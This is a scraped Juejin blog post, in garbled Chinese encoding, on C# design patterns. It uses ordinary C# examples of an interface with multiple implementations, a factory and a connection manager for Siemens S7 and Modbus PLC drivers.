</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[C#ä»£ç è®¾è®¡ä¸è®¾è®¡æ¨¡å¼]]></title>    <link>https://juejin.cn/post/7604522883485810722</link>    <guid>https://juejin.cn/post/7604522883485810722</guid>    <pubDate>2026-02-09T08:43:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604522883485810722" data-draft-id="7604155045236850723" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="C#ä»£ç è®¾è®¡ä¸è®¾è®¡æ¨¡å¼"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-02-09T08:43:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸ƒå…«æ˜Ÿå¤©"/> <meta itemprop="url" content="https://juejin.cn/user/3848733848768205"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            C#ä»£ç è®¾è®¡ä¸è®¾è®¡æ¨¡å¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3848733848768205/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸ƒå…«æ˜Ÿå¤©
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T08:43:09.000Z" title="Mon Feb 09 2026 08:43:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»20åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">è‡ªè¿°</h2>
<p><strong>èµ„æ–™</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Frefactoringguru.cn%2Fdesign-patterns%23intro-patterns" target="_blank" title="https://refactoringguru.cn/design-patterns#intro-patterns" ref="nofollow noopener noreferrer">Refactoring.Guruï¼ˆè®¾è®¡æ¨¡å¼å¯è§†åŒ–ï¼‰</a></li>
</ul>
<h2 data-id="heading-1">è®¾è®¡æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<p><strong>è®¾è®¡æ¨¡å¼</strong>æ˜¯è½¯ä»¶è®¾è®¡ä¸­å¸¸è§é—®é¢˜çš„å…¸å‹è§£å†³æ–¹æ¡ˆã€‚å®ƒä»¬æ›´åƒâ€œå¯è°ƒæ•´çš„é¢„åˆ¶è“å›¾â€ï¼Œç”¨äºè§£å†³ä»£ç ä¸­åå¤å‡ºç°çš„è®¾è®¡é—®é¢˜ã€‚</p>
<p>è®¾è®¡æ¨¡å¼ä¸æ–¹æ³•æˆ–åº“çš„ä½¿ç”¨æ–¹å¼ä¸åŒï¼Œä½ å¾ˆéš¾ç›´æ¥åœ¨è‡ªå·±çš„ç¨‹åºä¸­â€œå¥—ç”¨ä¸€æ®µå›ºå®šä»£ç â€ã€‚æ¨¡å¼ä¸æ˜¯ä¸€æ®µç‰¹å®šä»£ç ï¼Œè€Œæ˜¯è§£å†³ç‰¹å®šé—®é¢˜çš„<strong>é€šç”¨ç»“æ„/æ€è·¯</strong>ï¼›ä½ éœ€è¦ç»“åˆè‡ªå·±çš„ä¸Šä¸‹æ–‡å®ç°ã€‚</p>
<p>äººä»¬å¸¸å¸¸ä¼šæ··æ·†æ¨¡å¼å’Œç®—æ³•ï¼Œå› ä¸ºä¸¤è€…éƒ½æ˜¯â€œç‰¹å®šé—®é¢˜çš„å…¸å‹è§£å†³æ–¹æ¡ˆâ€ã€‚ä½†ç®—æ³•æ›´å¼ºè°ƒâ€œæ˜ç¡®æ­¥éª¤â€ï¼Œè€Œæ¨¡å¼æ›´å¼ºè°ƒâ€œç»“æ„ä¸è§’è‰²å…³ç³»â€ã€‚</p>
<ul>
<li>ç®—æ³•æ›´åƒèœè°±ï¼šæä¾›è¾¾æˆç›®æ ‡çš„æ˜ç¡®æ­¥éª¤ã€‚</li>
<li>æ¨¡å¼æ›´åƒè“å›¾ï¼šä½ èƒ½çœ‹åˆ°ç»“æ„ä¸ç›®çš„ï¼Œä½†å®ç°æ­¥éª¤éœ€è¦è‡ªå·±å†³å®šã€‚</li>
</ul>
<p>å¤§éƒ¨åˆ†æ¨¡å¼éƒ½æœ‰ç›¸å¯¹å›ºå®šçš„æè¿°æ–¹å¼ï¼Œé€šå¸¸åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>æ„å›¾</strong>ï¼šè¦è§£å†³ä»€ä¹ˆé—®é¢˜ã€æ ¸å¿ƒç›®æ ‡æ˜¯ä»€ä¹ˆã€‚</li>
<li><strong>åŠ¨æœº</strong>ï¼šé—®é¢˜æ˜¯æ€ä¹ˆäº§ç”Ÿçš„ï¼Œä¸ºä»€ä¹ˆéœ€è¦è¯¥æ¨¡å¼ã€‚</li>
<li><strong>ç»“æ„</strong>ï¼šå‚ä¸è§’è‰²ä¸å…³ç³»ï¼ˆç±»å›¾/å¯¹è±¡å…³ç³»ï¼‰ã€‚</li>
<li><strong>å®ç°</strong>ï¼šåœ¨ä¸åŒè¯­è¨€ä¸­çš„ç¤ºä¾‹å®ç°ä¸å˜ä½“ã€‚</li>
</ul>
<h2 data-id="heading-2">å­¦ä¹ è·¯çº¿ï¼ˆå»ºè®®å…ˆå­¦å“ªäº›ï¼‰</h2>
<p>ä½ ä¸éœ€è¦ä¸€å£æ°”æŠŠ GoF 23 ä¸ªå…¨èƒŒå®Œã€‚æ›´å¯è¡Œçš„æ–¹å¼æ˜¯ï¼šå…ˆæŒæ¡â€œé«˜é¢‘ + å®¹æ˜“è½åœ°â€çš„ 8~10 ä¸ªæ¨¡å¼ï¼Œå†é€šè¿‡ä¸€ä¸ªå°é¡¹ç›®æŠŠå®ƒä»¬ä¸²èµ·æ¥ã€‚</p>
<h3 data-id="heading-3">1) å‰æœŸä¼˜å…ˆï¼ˆ8~10 ä¸ªé«˜é¢‘ï¼‰</h3>
<ul>
<li>åˆ›å»ºå‹ï¼šFactory Methodï¼ˆå·¥å‚æ–¹æ³•ï¼‰ã€Abstract Factoryï¼ˆæŠ½è±¡å·¥å‚ï¼‰</li>
<li>ç»“æ„å‹ï¼šAdapterï¼ˆé€‚é…å™¨ï¼‰ã€Facadeï¼ˆé—¨é¢/å¤–è§‚ï¼‰ã€Decoratorï¼ˆè£…é¥°å™¨ï¼‰</li>
<li>è¡Œä¸ºå‹ï¼šStrategyï¼ˆç­–ç•¥ï¼‰ã€Template Methodï¼ˆæ¨¡æ¿æ–¹æ³•ï¼‰ã€Observerï¼ˆè§‚å¯Ÿè€…/äº‹ä»¶ï¼‰</li>
<li>å¯é€‰ï¼šCommandï¼ˆå‘½ä»¤ï¼‰ã€Stateï¼ˆçŠ¶æ€ï¼‰</li>
</ul>
<blockquote>
<p>Singletonï¼ˆå•ä¾‹ï¼‰å¾ˆå¸¸è§ï¼Œä½†ä¹Ÿæœ€å®¹æ˜“è¢«æ»¥ç”¨ï¼›å»ºè®®æŠŠå®ƒå½“æˆâ€œå·¥å…·â€ï¼Œè€Œä¸æ˜¯â€œæ¶æ„æ ¸å¿ƒâ€ã€‚</p>
</blockquote>
<h3 data-id="heading-4">2) æ¯”æ¨¡å¼æ›´é‡è¦çš„ä¸¤æ¡ä¸»çº¿</h3>
<ul>
<li>SOLIDï¼ˆå°¤å…¶ SRPã€OCPã€DIPï¼‰</li>
<li>ç»„åˆä¼˜äºç»§æ‰¿ + ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰ï¼šæŠŠâ€œå˜åŒ–â€æ”¾åˆ°å¯æ›¿æ¢çš„ä¾èµ–é‡Œï¼Œè€Œä¸æ˜¯æŠŠå˜åŒ–å†™æ­»åœ¨ç»§æ‰¿å±‚çº§é‡Œ</li>
</ul>
<h3 data-id="heading-5">3) ç”¨ä¸€ä¸ªè´¯ç©¿æ¡ˆä¾‹æ¥å­¦ï¼ˆæ¨èï¼šå¤šåè®®å¤šPLC / HSL å°è£…ï¼‰</h3>
<p>ç›®æ ‡ä¸æ˜¯â€œæŠŠæ‰€æœ‰åè®®éƒ½åšå®Œâ€ï¼Œè€Œæ˜¯å…ˆåšä¸€ä¸ªæœ€å°é—­ç¯ï¼š</p>
<ul>
<li>æ”¯æŒ 1~2 ç§åè®®ï¼ˆä¾‹å¦‚ ModbusTcp + S7ï¼‰</li>
<li>ç»Ÿä¸€å¯¹å¤– APIï¼šConnect / Read / Write</li>
<li>å¯æ’æ‹”æ‰©å±•ï¼šæ–°å¢åè®®ä¸æ”¹ä¸šåŠ¡ä»£ç </li>
</ul>
<p>ä½ ä¼šè‡ªç„¶ç”¨ä¸Šï¼š</p>
<ul>
<li>Strategyï¼šæŒ‰åè®®åˆ‡æ¢é©±åŠ¨å®ç°</li>
<li>Adapterï¼šæŠŠ HSL ä¸åŒç±»çš„æ¥å£â€œé€‚é…â€æˆç»Ÿä¸€æ¥å£</li>
<li>Factoryï¼šæ ¹æ®é…ç½®åˆ›å»ºé©±åŠ¨</li>
<li>Facadeï¼šå¯¹å¤–æä¾›æ›´ç®€å•çš„å…¥å£</li>
<li>Decoratorï¼šæ—¥å¿—ã€é‡è¯•ã€è¶…æ—¶ã€æ–­çº¿é‡è¿ç­‰æ¨ªåˆ‡èƒ½åŠ›</li>
</ul>
<h3 data-id="heading-6">4) ç›®å½•ï¼ˆé€Ÿè·³ï¼‰</h3>
<ul>
<li>è®¾è®¡æ¨¡å¼åŸºç¡€ï¼šå­¦ä¹ è·¯çº¿ / OOP é€ŸæŸ¥</li>
<li>åˆ›å»ºå‹ï¼šå•ä¾‹ / å·¥å‚æ€æƒ³ / å·¥å‚æ–¹æ³• / æŠ½è±¡å·¥å‚</li>
<li>ç»“æ„å‹ï¼šè£…é¥°å™¨ / é€‚é…å™¨ / é—¨é¢</li>
<li>è¡Œä¸ºå‹ï¼šç­–ç•¥ / æ¨¡æ¿æ–¹æ³• / è§‚å¯Ÿè€… /ï¼ˆå¯é€‰ï¼‰å‘½ä»¤ /ï¼ˆå¯é€‰ï¼‰çŠ¶æ€</li>
<li>ä¸»çº¿ï¼šSOLID / DI ä¸ç»„åˆä¼˜äºç»§æ‰¿</li>
</ul>
<h2 data-id="heading-7">OOP é€ŸæŸ¥ï¼ˆä½ æåˆ°çš„é‚£äº›â€œå¿˜äº†â€çš„ç‚¹ï¼‰</h2>
<p>è¿™éƒ¨åˆ†ä¸æ˜¯è®¾è®¡æ¨¡å¼ï¼Œä½†å®ƒæ˜¯è®¾è®¡æ¨¡å¼èƒ½å¦çœ‹æ‡‚/å†™å¯¹çš„åœ°åŸºã€‚</p>
<h3 data-id="heading-8">1) æ¥å£ + å¤šå®ç° + é›†åˆæ¥æ”¶ï¼ˆå¤šæ€ï¼‰</h3>
<p>å…³é”®ç»“è®ºï¼š</p>
<ul>
<li>é›†åˆçš„é™æ€ç±»å‹å†³å®šâ€œä½ èƒ½è°ƒç”¨å“ªäº›æˆå‘˜â€ï¼›</li>
<li>å¯¹è±¡çš„è¿è¡Œæ—¶ç±»å‹å†³å®šâ€œæœ€ç»ˆè°ƒç”¨å“ªä¸ªå®ç°â€ã€‚</li>
</ul>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IPlcDriver</span>
{
 Â  Â <span class="hljs-built_in">string</span> Name { <span class="hljs-keyword">get</span>; }
 Â  Â <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Connect</span>()</span>;
}
â€‹
<span class="hljs-keyword">public</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title">S7Driver</span> : <span class="hljs-title">IPlcDriver</span>
{
 Â  Â <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Name =&gt; <span class="hljs-string">"S7"</span>;
 Â  Â <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Connect</span>()</span> { <span class="hljs-comment">/* ... */</span> }
}
â€‹
<span class="hljs-keyword">public</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title">ModbusDriver</span> : <span class="hljs-title">IPlcDriver</span>
{
 Â  Â <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Name =&gt; <span class="hljs-string">"Modbus"</span>;
 Â  Â <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Connect</span>()</span> { <span class="hljs-comment">/* ... */</span> }
}
â€‹
<span class="hljs-keyword">var</span> drivers = <span class="hljs-keyword">new</span> List&lt;IPlcDriver&gt; { <span class="hljs-keyword">new</span> S7Driver(), <span class="hljs-keyword">new</span> ModbusDriver() };
<span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> d <span class="hljs-keyword">in</span> drivers)
{
 Â  Â Console.WriteLine(d.Name);
 Â  Â d.Connect(); <span class="hljs-comment">// è¿™é‡Œè°ƒç”¨çš„æ˜¯å¯¹è±¡å®é™…ç±»å‹çš„å®ç°</span>
}
</code></pre>
<h3 data-id="heading-9">2) æŠ½è±¡ç±» + è™šæ–¹æ³• + base è°ƒç”¨ï¼ˆæ¨¡æ¿æ‰©å±•ï¼‰</h3>
<ul>
<li><code>abstract</code>ï¼šå¼ºåˆ¶å­ç±»å®ç°ï¼ˆæ²¡æœ‰é»˜è®¤å®ç°ï¼‰ã€‚</li>
<li><code>virtual</code>ï¼šå­ç±»å¯ä»¥é€‰æ‹©é‡å†™ï¼ˆæœ‰é»˜è®¤å®ç°ï¼‰ã€‚</li>
<li><code>override</code>ï¼šå­ç±»é‡å†™çˆ¶ç±»è™šæ–¹æ³•ã€‚</li>
<li><code>base.Xxx()</code>ï¼šåœ¨â€œä¿ç•™çˆ¶ç±»è¡Œä¸ºâ€çš„åŸºç¡€ä¸Šåšæ‰©å±•ã€‚</li>
</ul>
<p>è¿™é€šå¸¸å¯¹åº” Template Methodï¼ˆæ¨¡æ¿æ–¹æ³•ï¼‰ï¼šçˆ¶ç±»å®šä¹‰ç¨³å®šæµç¨‹ï¼Œå­ç±»å®šåˆ¶å¯å˜æ­¥éª¤ã€‚</p>
<h3 data-id="heading-10">3) ç»„åˆä¼˜äºç»§æ‰¿ï¼ˆå‡å°‘â€œè¶Šå­¦è¶Šä¹±â€çš„å…³é”®ï¼‰</h3>
<p>å¦‚æœä½ çš„å˜åŒ–ç‚¹å¾ˆå¤šï¼ˆåè®®ã€æ—¥å¿—ã€é‡è¯•ã€ç¼“å­˜â€¦â€¦ï¼‰ï¼Œä¼˜å…ˆç”¨ç»„åˆï¼ˆæŠŠèƒ½åŠ›æ‹†æˆå¯æ›¿æ¢çš„å¯¹è±¡ï¼‰è€Œä¸æ˜¯æŠŠå˜åŒ–å †è¿›ç»§æ‰¿å±‚çº§ã€‚</p>
<h2 data-id="heading-11">å•æ¥å£å¤šå®ä¾‹è®¾è®¡</h2>
<h4 data-id="heading-12">æ¦‚å¿µ</h4>
<ul>
<li><strong>å•æ¥å£å¤šå®ä¾‹</strong>ï¼šä¸€ä¸ªæ¥å£ï¼ˆå¥‘çº¦ï¼‰å¯¹åº”å¤šä¸ªå®ç°ç±»ï¼ˆå…·ä½“é€»è¾‘ï¼‰ã€‚ç”¨æ¥å£ç±»å‹ä½œä¸ºâ€œå®¹å™¨â€ï¼Œä¿å­˜å’Œç®¡ç†ä¸åŒå®ä¾‹ï¼Œè¿è¡Œæ—¶é€šè¿‡æ¥å£è°ƒç”¨åŒºåˆ†å®ç°ã€‚</li>
<li><strong>æ ¸å¿ƒåŸç†</strong>ï¼šé¢å‘æ¥å£ç¼–ç¨‹ï¼ˆInterface-based Programmingï¼‰ã€å¤šæ€ï¼ˆPolymorphismï¼‰ã€‚æ¥å£å®šä¹‰ç»Ÿä¸€è¡Œä¸ºï¼Œå®ç°ç±»æä¾›å·®å¼‚åŒ–é€»è¾‘ã€‚</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå¤šPLCåè®®ï¼ˆå¦‚Siemensã€Modbusï¼‰ã€å¤šæ•°æ®æºç­‰ï¼Œéœ€è¦ç»Ÿä¸€ç®¡ç†ä¸åŒç±»å‹å®ä¾‹ã€‚</li>
</ul>
<h4 data-id="heading-13">å®ç°æ­¥éª¤</h4>
<ol start="0">
<li>
<p><strong>å®šä¹‰æ¥å£</strong>ï¼š</p>
<ul>
<li>æŠ½è±¡å…¬å…±è¡Œä¸ºã€‚</li>
</ul>
<p>C#</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IPlcConnection</span>
{
 Â   ConnectType ConnectionType { <span class="hljs-keyword">get</span>; }
 Â   <span class="hljs-function">Task&lt;<span class="hljs-built_in">bool</span>&gt; <span class="hljs-title">ConnectAsync</span>()</span>;
 Â   <span class="hljs-function">Task <span class="hljs-title">DisconnectAsync</span>()</span>;
 Â   <span class="hljs-comment">// å…¶ä»–ç»Ÿä¸€æ–¹æ³•</span>
}
</code></pre>
</li>
<li>
<p><strong>å®ç°å…·ä½“ç±»</strong>ï¼š</p>
<ul>
<li>æ¯ä¸ªåè®®ä¸€ä¸ªç±»ï¼Œå®ç°æ¥å£ã€‚</li>
</ul>
<p>C#</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">SiemensS7NetConnect</span> : <span class="hljs-title">IPlcConnection</span>
{
 Â   <span class="hljs-keyword">public</span> ConnectType ConnectionType =&gt; ConnectType.SiemensS7Net;
 Â   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task&lt;<span class="hljs-built_in">bool</span>&gt; <span class="hljs-title">ConnectAsync</span>()</span> { <span class="hljs-comment">/* Siemensé€»è¾‘ */</span> }
}
</code></pre>
</li>
<li>
<p><strong>ç”¨å­—å…¸ç®¡ç†å®ä¾‹</strong>ï¼š</p>
<ul>
<li>Keyï¼šå”¯ä¸€æ ‡è¯†ï¼ˆå¦‚PLC IDï¼‰ã€‚</li>
<li>Valueï¼šæ¥å£ç±»å‹ï¼Œå­˜å®ç°å®ä¾‹ã€‚</li>
</ul>
<p>C#</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">PlcConnectionManager</span>
{
 Â   <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> Dictionary&lt;<span class="hljs-built_in">string</span>, IPlcConnection&gt; _connections = <span class="hljs-keyword">new</span>();
â€‹
 Â   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">AddConnection</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> key, IPlcConnection conn</span>)</span> =&gt; _connections[key] = conn;
â€‹
 Â   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">ConnectAllAsync</span>()</span>
 Â   {
 Â  Â  Â   <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> conn <span class="hljs-keyword">in</span> _connections.Values)
 Â  Â  Â   {
 Â  Â  Â  Â  Â   <span class="hljs-keyword">await</span> conn.ConnectAsync();  <span class="hljs-comment">// ç»Ÿä¸€è°ƒç”¨ï¼Œå¤šæ€ç”Ÿæ•ˆ</span>
 Â  Â  Â   }
 Â   }
â€‹
 Â   <span class="hljs-function"><span class="hljs-keyword">public</span> IPlcConnection <span class="hljs-title">GetConnection</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> key</span>)</span> =&gt; _connections[key];
}
</code></pre>
</li>
<li>
<p><strong>å·¥å‚åˆ›å»ºå®ä¾‹</strong>ï¼š</p>
<ul>
<li>æ ¹æ®é…ç½®åˆ›å»ºå¯¹åº”å®ç°ã€‚</li>
</ul>
<p>C#</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> IPlcConnection <span class="hljs-title">CreateConnection</span><span class="hljs-params">(PlcConfig config)</span>
</span>{
 Â   <span class="hljs-keyword">return</span> config.Type <span class="hljs-keyword">switch</span>
 Â   {
 Â  Â  Â   ConnectType.SiemensS7Net =&gt; <span class="hljs-keyword">new</span> <span class="hljs-built_in">SiemensS7NetConnect</span>(config),
 Â  Â  Â   ConnectType.ModbusTcpNet =&gt; <span class="hljs-keyword">new</span> <span class="hljs-built_in">ModbusTcpConnect</span>(config),
 Â  Â  Â   _ =&gt; <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">NotSupportedException</span>()
 Â   };
}
</code></pre>
</li>
</ol>
<h4 data-id="heading-14">ç¤ºä¾‹åº”ç”¨</h4>
<ul>
<li>
<p>åˆå§‹åŒ–ï¼š</p>
<p>C#</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">var</span> manager = <span class="hljs-keyword">new</span> PlcConnectionManager();
manager.AddConnection(<span class="hljs-string">"plc1"</span>, <span class="hljs-keyword">factory</span>.CreateConnection(siemensConfig));
manager.AddConnection(<span class="hljs-string">"plc2"</span>, <span class="hljs-keyword">factory</span>.CreateConnection(modbusConfig));
<span class="hljs-keyword">await</span> manager.ConnectAllAsync();  <span class="hljs-comment">// è‡ªåŠ¨è°ƒç”¨å„è‡ªå®ç°</span>
</code></pre>
</li>
<li>
<p>è°ƒç”¨ï¼š<code>manager.GetConnection("plc1").ConnectAsync()</code> è¿”å›Siemensé€»è¾‘ã€‚</p>
</li>
</ul>
<h4 data-id="heading-15">ä¼˜åŠ¿</h4>
<ul>
<li><strong>ç»Ÿä¸€ç®¡ç†</strong>ï¼šå­—å…¸å­˜æ¥å£ï¼Œæ— éœ€ç±»å‹åˆ¤æ–­ã€‚</li>
<li><strong>æ‰©å±•æ€§</strong>ï¼šåŠ æ–°åè®®ï¼ŒåªåŠ å®ç°ç±»å’Œå·¥å‚caseã€‚</li>
<li><strong>è§£è€¦</strong>ï¼šä»£ç ä¾èµ–æ¥å£ï¼Œä¸ç»‘å®šå…·ä½“ç±»ã€‚</li>
<li><strong>ç±»å‹å®‰å…¨</strong>ï¼šç¼–è¯‘æ—¶æ£€æŸ¥æ¥å£å¥‘çº¦ã€‚</li>
</ul>
<h4 data-id="heading-16">æ³¨æ„äº‹é¡¹</h4>
<ul>
<li><strong>æ¥å£è®¾è®¡</strong>ï¼šåªæ”¾å…¬å…±æ–¹æ³•ï¼Œé¿å…å®ç°ç±»å·®å¼‚è¿‡å¤§ã€‚</li>
<li><strong>ç”Ÿå‘½å‘¨æœŸ</strong>ï¼šç”¨DIç®¡ç†å®ä¾‹ï¼ˆABPä¸­æ³¨å†Œä¸ºTransient/Singletonï¼‰ã€‚</li>
<li><strong>é”™è¯¯å¤„ç†</strong>ï¼šåœ¨å®ç°ç±»ä¸­å¤„ç†å¼‚å¸¸ï¼Œæ¥å£æ–¹æ³•æŠ›NotImplementedExceptionã€‚</li>
<li><strong>æ€§èƒ½</strong>ï¼šå­—å…¸æŸ¥è¯¢å¿«ï¼Œä½†å®ä¾‹å¤šæ—¶è€ƒè™‘ä¼˜åŒ–ã€‚</li>
</ul>
<h4 data-id="heading-17">ä¸ºä»€ä¹ˆä¸èƒ½/ä¸è¯¥æ³¨å†ŒIPlcConnectionï¼Ÿ</h4>
<ul>
<li><strong>æ— å®ç°</strong>ï¼šæ¥å£æ— ä»£ç ï¼ŒIOCæ³¨å†Œå®ƒæ²¡æ„ä¹‰ï¼ˆå®¹å™¨ä¸çŸ¥é“æ€ä¹ˆå®ä¾‹åŒ–ï¼‰ã€‚</li>
